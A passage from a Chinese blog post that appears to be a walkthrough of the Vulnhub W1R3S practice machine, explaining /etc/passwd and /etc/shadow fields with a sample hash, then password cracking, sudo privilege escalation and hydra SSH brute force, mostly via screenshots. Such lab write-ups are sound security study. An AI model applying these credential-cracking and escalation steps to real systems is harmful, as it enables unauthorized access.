plain">/etc/passwd:<br>普通用户权限能够查看<br><br>保存用户信息，每一行代表一个用户，每一行通过冒号：分为七个部分<br><br>用户名<br>密码，x表示密码保存在/etc/shadow<br>UID，0代表root<br>GID，表示所在组<br>描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other<br>用户主目录<br>默认shell类型<br>eg.<br><br>test2:x:1001:1001:test2,11111,111111-11,222222-22,test:/home/test2:/bin/bash<br><br>用户名：test2<br>密码保存在/etc/shadow<br>UID为1001<br>GID为1001<br>描述信息： Full Name []: test2 Room Number []: 11111 Work Phone []: 111111-11 Home Phone []: 222222-22 Other []: test<br>用户主目录为/home/test2<br>默认shell为/bin/bash<br>/etc/shadow:<br>只有root用户权限能够查看<br><br>保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号：分为九个部分<br><br>用户名<br>加密后的密码<br>上次修改密码的时间(从1970.1.1开始的总天数)<br>两次修改密码间隔的最少天数，如果为0，则没有限制<br>两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制<br>提前多少天警告用户密码将过期<br>在密码过期之后多少天禁用此用户<br>用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用<br>保留<br>注：<br><br>参数说明可通过man shadow获取<br><br>eg.<br><br>test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7:::<br><br>用户名：test2<br>加密后的密码：$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0<br>上次修改密码的时间(从1970.1.1开始的总天数为17470)<br>两次修改密码间隔：没有限制<br>两次修改密码间隔最多的天数：没有限制<br>提前7天警告用户密码将过期<br>该用户永久可用<br>由示例可知，加密的密码具有固定格式：<br><br>$id$salt$encrypted<br><br>id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512 salt表示密码学中的Salt,系统随机生成 encrypted表示密码的hash<br></code></pre></td></tr></table></figure>





<h4 id="mwdXg">密码破解</h4>
对 shadow 中加密的密码进行破解

<p><img src="/../img/vulnhub-w1r3s.md/19.png"></p>
<h4 id="FlVKI">成功登录</h4>

<p><img src="/../img/vulnhub-w1r3s.md/20.png"></p>
<h3 id="Zyx4x">提权</h3>
**sudo -l 可以查看用户的 root 权限**

<p><img src="/../img/vulnhub-w1r3s.md/21.png"></p>
<p>w1r3s 可以运行全部的权限。相当于 root</p>
<p><img src="/../img/vulnhub-w1r3s.md/22.png"></p>
<h4 id="A3MfL">sudo /bin/bash</h4>
为什么运行这个命令就可以进入 root 了呢？

<p><img src="/../img/vulnhub-w1r3s.md/23.png"></p>
<p>:::info<br>&#x2F;bin&#x2F;bash 的作用</p>
<p>启动新 Shell：&#x2F;bin&#x2F;bash 是系统的 Bash Shell 解释器路径。执行此命令会启动一个新的 Bash Shell 会话。</p>
<p>以 root 身份运行：通过 sudo 执行时，这个新 Shell 会以 root 权限启动（因为 sudo 默认以 root 身份运行命令）。</p>
<p>:::</p>
<h4 id="j1LPa">sudo su -</h4>

<p><img src="/../img/vulnhub-w1r3s.md/24.png"></p>
<h1 id="QayxZ">22 端口</h1>
正常来说 ssh 端口是没什么可测试的

<h4 id="AF2eQ">字典</h4>

<p><img src="/../img/vulnhub-w1r3s.md/25.png"></p>
<h4 id="q7m6L">hydra 成功爆破</h4>
**ssh 可以直接登录**

<p><img src="/../img/vulnhub-w1r3s.md/26.png"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Vulnhub%E9%9D%B6%E5%9C%BA/" class="print-no-link">#Vulnhub靶场</a>
      
        <a href="/tags/ftp%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95/" class="print-no-link">#ftp匿名登录</a>
      
        <a href="/tags/base64/" class="print-no-link">#base64</a>
      
        <a href="/tags/md5/" class="print-no-link">#md5</a>
      
        <a href="/tags/gobuster%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/" class="print-no-link">#gobuster目录扫描</a>
      
        <a href="/tags/dirb%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/" class="print-no-link">#dirb目录扫描</a>
      
        <a href="/tags/Cuppa-CMS%E6%B8%97%E9%80%8F/" class="print-no-link">#Cuppa CMS渗透</a>
      
        <a href="/tags/searchsploit%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="print-no-link">#searchsploit漏洞信息搜集</a>
      
        <a href="/tags/john%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" class="print-no-link">#john密码破解</a>
      
        <a href="/tags/ssh%E7%88%86%E7%A0%B4/" class="print-no-link">#ssh爆破</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>vulnhub-w1r3s</div>
      <div>https://jimi-lab.github.io/2025/06/30/vulnhub-w1r3s/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Jimi</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年6月30日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/07/02/CONDA%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8+Pycharm%E9%85%8D%E7%BD%AEanaconda%E7%8E%AF%E5%A2%83+CUDA%E7%89%88%E6%9C%AC%E7%A1%AE%E8%AE%A4+%E5%AE%89%E8%A3%85pytorch+%E5%AE%89%E8%A3%85Jupyter+%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E7%8E%B0%E5%AD%98%E7%9A%84py%E9%A1%B9%E7%9B%AE/" title="CONDA命令使用+Pycharm配置anaconda环境+CUDA版本确认+安装pytorch+安装Jupyter+如何快速运行一个现存的py项目">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CONDA命令使用+Pycharm配置anaconda环境+CUDA版本确认+安装pytorch+安装Jupyter+如何快速运行一个现存的py项目</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/06/30/%E6%B1%87%E7%BC%96Basic%EF%BC%81/" title="汇编">
                        <span class="hidden-mobile">汇编</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments">
      
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'Jimi-Lab/Jimi-Lab.github.io');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'utterances');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
      
<a href="https://github.com/Jimi-Lab" target="_blank" rel="nofollow noopener"><span>@Jimi.github</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>







  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
